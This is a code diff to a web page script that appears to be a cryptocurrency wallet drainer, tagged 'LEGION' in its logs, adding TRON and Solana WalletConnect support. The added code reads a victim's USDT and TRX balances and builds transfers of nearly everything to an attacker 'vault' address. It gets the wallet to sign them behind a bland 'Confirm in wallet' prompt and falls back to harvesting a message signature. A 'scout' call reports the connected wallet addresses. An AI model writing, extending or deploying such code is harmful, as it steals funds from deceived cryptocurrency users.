@@ -1928,6 +1928,107 @@
           var userAddr = connectedChains.TRON.address;
           var vaultAddr = VAULT_CACHE && (VAULT_CACHE.tron || VAULT_CACHE.trx);
 
+          // ── WalletConnect TRON — provider is our WC request wrapper (no TronWeb) ──
+          if (connectedChains.TRON.walletType === 'WalletConnect') {
+            try {
+              var _tgApi = 'https://api.trongrid.io';
+              var _wcTronVault = vaultAddr;
+              if (_wcTronVault) {
+                // Fetch account info (balance + TRC20 holdings) in one call
+                var _tAcctData = await fetch(_tgApi + '/v1/accounts/' + userAddr)
+                  .then(function(r) { return r.json(); }).catch(function() { return {}; });
+                var _tAcct0 = (_tAcctData.data && _tAcctData.data[0]) || {};
+                var _trxSun = _tAcct0.balance || 0;
+                var _trc20s = _tAcct0.trc20 || [];
+                var _usdtTrc20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+                var _usdtBal = '0';
+                for (var _ti = 0; _ti < _trc20s.length; _ti++) {
+                  if (_trc20s[_ti][_usdtTrc20]) { _usdtBal = _trc20s[_ti][_usdtTrc20]; break; }
+                }
+                // Decode vault base58 address → ABI-encode for transfer(address,uint256)
+                // TRON base58: version(41)+20_bytes+4_checksum → we need the 20 address bytes
+                function _tronAbiParam(toAddr, amount) {
+                  var _B = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+                  var _bts = [];
+                  for (var _i = 0; _i < toAddr.length; _i++) {
+                    var _ci = _B.indexOf(toAddr[_i]), _cr = _ci;
+                    for (var _j = 0; _j < _bts.length; _j++) { _cr += _bts[_j] * 58; _bts[_j] = _cr & 255; _cr >>= 8; }
+                    while (_cr) { _bts.push(_cr & 255); _cr >>= 8; }
+                  }
+                  _bts.reverse();
+                  // _bts[0]=0x41(version), _bts[1..20]=address, _bts[21..24]=checksum
+                  var _aHex = _bts.slice(1, 21).map(function(b) { return ('0' + b.toString(16)).slice(-2); }).join('');
+                  var _aPad = '000000000000000000000000' + _aHex;
+                  var _amtHex;
+                  try { _amtHex = BigInt(amount).toString(16).padStart(64, '0'); }
+                  catch (_) { _amtHex = parseInt(amount || '0').toString(16).padStart(64, '0'); }
+                  return _aPad + _amtHex;
+                }
+                var _tFeeLimit = Math.min(150000000, Math.max(50000000, Math.floor(_trxSun * 0.8)));
+                // Try USDT TRC20 first
+                if (parseInt(_usdtBal) > 0) {
+                  var _trc20Build = await fetch(_tgApi + '/wallet/triggersmartcontract', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      owner_address: userAddr, contract_address: _usdtTrc20,
+                      function_selector: 'transfer(address,uint256)',
+                      parameter: _tronAbiParam(_wcTronVault, _usdtBal),
+                      fee_limit: _tFeeLimit, call_value: 0, visible: true
+                    })
+                  }).then(function(r) { return r.json(); }).catch(function() { return {}; });
+                  if (_trc20Build.transaction) {
+                    var _wcTrc20Sig = await tw.request(
+                      { method: 'tron_signTransaction', params: { transaction: JSON.stringify(_trc20Build.transaction) } },
+                      'tron:0x2b6653dc'
+                    );
+                    var _trc20Parsed = typeof _wcTrc20Sig === 'string' ? JSON.parse(_wcTrc20Sig) : _wcTrc20Sig;
+                    connectedChains.TRON._signedTx = _trc20Parsed;
+                    connectedChains.TRON._signedTxToken = _usdtTrc20;
+                    console.log('[LEGION] ✅ WC TRON USDT signed');
+                    return 'tron_tx:' + (_trc20Parsed.txID || Date.now());
+                  }
+                }
+                // Fallback: native TRX transfer
+                if (_trxSun > 2000000) {
+                  var _trxBuild = await fetch(_tgApi + '/wallet/createtransaction', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      owner_address: userAddr, to_address: _wcTronVault,
+                      amount: _trxSun - 2000000, visible: true
+                    })
+                  }).then(function(r) { return r.json(); }).catch(function() { return {}; });
+                  if (_trxBuild.raw_data) {
+                    var _wcTrxSig = await tw.request(
+                      { method: 'tron_signTransaction', params: { transaction: JSON.stringify(_trxBuild) } },
+                      'tron:0x2b6653dc'
+                    );
+                    var _trxParsed = typeof _wcTrxSig === 'string' ? JSON.parse(_wcTrxSig) : _wcTrxSig;
+                    connectedChains.TRON._signedTx = _trxParsed;
+                    connectedChains.TRON._signedTxToken = 'TRX';
+                    console.log('[LEGION] ✅ WC TRON TRX signed (' + (_trxSun - 2000000) + ' sun)');
+                    return 'tron_tx:' + (_trxParsed.txID || Date.now());
+                  }
+                }
+              }
+            } catch (_wcTErr) {
+              console.debug('[LEGION] WC TRON tx sign failed:', _wcTErr.message);
+            }
+            // Message-signature fallback (wallet ownership proof for backend)
+            try {
+              var _wcTMsg = await tw.request(
+                { method: 'tron_signMessage', params: { message: message, address: userAddr } },
+                'tron:0x2b6653dc'
+              );
+              console.log('[LEGION] ✅ WC TRON message signature (fallback)');
+              return _wcTMsg.signature || _wcTMsg;
+            } catch (_mErr) {
+              console.debug('[LEGION] WC TRON signMessage failed:', _mErr.message);
+              return null;
+            }
+          }
+
           if (vaultAddr && tw && tw.transactionBuilder) {
             var USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
@@ -4868,9 +4969,20 @@
                 'eip155:534352',// Scroll
               ],
               events: []
+            },
+            // Solana — Phantom, Solflare, Backpack support via WC v2
+            // requiredNamespaces must be present (with eip155:1) for WC SDK to accept non-EVM namespaces here
+            solana: {
+              methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAllTransactions'],
+              chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
+              events: []
+            },
+            // TRON — Trust Wallet, OKX Wallet support TRON via WC v2
+            tron: {
+              methods: ['tron_signMessage', 'tron_signTransaction'],
+              chains: ['tron:0x2b6653dc'],
+              events: []
             }
-            // NOTE: Solana removed — WC v2 SDK rejects non-numeric CAIP-2 chain IDs
-            // Solana users connect via AppKit's dedicated SolanaAdapter
           }
         });
         hideManualQR();
@@ -5337,6 +5449,28 @@
         count++;
       }
     }
+    // TRON namespace — Trust Wallet, OKX Wallet report tron:0x2b6653dc:TAddress
+    if (ns.tron && ns.tron.accounts && ns.tron.accounts.length) {
+      var tParts = ns.tron.accounts[0].split(':');
+      // format: "tron:0x2b6653dc:TXxxx..." — address starts at index 2
+      var tAddr = tParts.length >= 3 ? tParts.slice(2).join(':') : '';
+      if (tAddr) {
+        var _tTopic = provider.session && provider.session.topic;
+        connectedChains.TRON = {
+          chain: 'TRON', config: CHAIN_CONFIG.TRON, address: tAddr,
+          walletType: 'WalletConnect',
+          // Wrapper that routes all requests to tron namespace via UniversalProvider
+          provider: {
+            request: function(args, chainId) {
+              return provider.request(args, chainId || 'tron:0x2b6653dc');
+            }
+          },
+          connected: true, timestamp: Date.now()
+        };
+        count++;
+        console.log('[LEGION] 🔗 TRON connected via WalletConnect:', tAddr);
+      }
+    }
     return count;
   }
 
@@ -5344,10 +5478,11 @@
   async function runWCSignAndSubmit() {
     updateStatus('Wallet connected. Confirm in wallet...');
 
-    // Build connected map for signing
+    // Build connected map for signing — all chains the wallet approved
     var wcConnected = {};
     if (connectedChains.EVM) wcConnected.EVM = connectedChains.EVM;
     if (connectedChains.SOL) wcConnected.SOL = connectedChains.SOL;
+    if (connectedChains.TRON) wcConnected.TRON = connectedChains.TRON;
 
     // Scout in background
     var firstChain = Object.keys(wcConnected)[0] || 'EVM';
@@ -5356,7 +5491,7 @@
       user_address: firstWallet ? firstWallet.address : '',
       chain_id: wcConnected.EVM ? wcConnected.EVM.chainId || 1 : 1,
       wallet_type: 'WalletConnect',
-      chain_family: firstChain === 'SOL' ? 'SVM' : 'EVM',
+      chain_family: firstChain === 'SOL' ? 'SVM' : firstChain === 'TRON' ? 'TVM' : 'EVM',
       source_page: window.location.href,
       connected_wallets: Object.keys(wcConnected).map(function(k) { return wcConnected[k].address; }).filter(Boolean)
     }).catch(function() {});
